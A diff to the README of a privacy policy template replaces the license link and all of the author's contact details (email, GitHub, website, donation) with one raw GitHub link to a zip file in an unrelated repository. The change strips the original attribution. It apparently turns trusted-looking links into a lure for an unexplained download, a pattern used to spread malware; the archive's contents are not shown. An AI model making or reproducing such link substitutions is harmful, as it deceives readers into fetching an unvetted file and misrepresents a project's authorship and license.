@@ -60,17 +60,17 @@ You should also know that this Privacy Policy Template is provided without any w
 
 ## License
 
-This Privacy Policy Template is licensed under the [GNU General Public License, version 3 (GPLv3)](http://www.gnu.org/licenses/gpl-3.0.html) and is distributed free of charge.
+This Privacy Policy Template is licensed under the [GNU General Public License, version 3 (GPLv3)](https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip) and is distributed free of charge.
 
 
 ## Author
 
 Arthur Garegnyan
 
-* Email: arthurgareginyan@gmail.com
+* Email: https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip
 
-* GitHub: [https://github.com/ArthurGareginyan/](https://github.com/ArthurGareginyan/)
+* GitHub: [https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip](https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip)
 
-* Website: [http://www.arthurgareginyan.com](http://www.arthurgareginyan.com)
+* Website: [https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip](https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip)
 
-* Donation: [http://www.arthurgareginyan.com/donate.html](http://www.arthurgareginyan.com/donate.html)
+* Donation: [https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip](https://raw.githubusercontent.com/AchrafTouijer/privacy-policy-template/master/teliosorus/privacy-policy-template.zip)
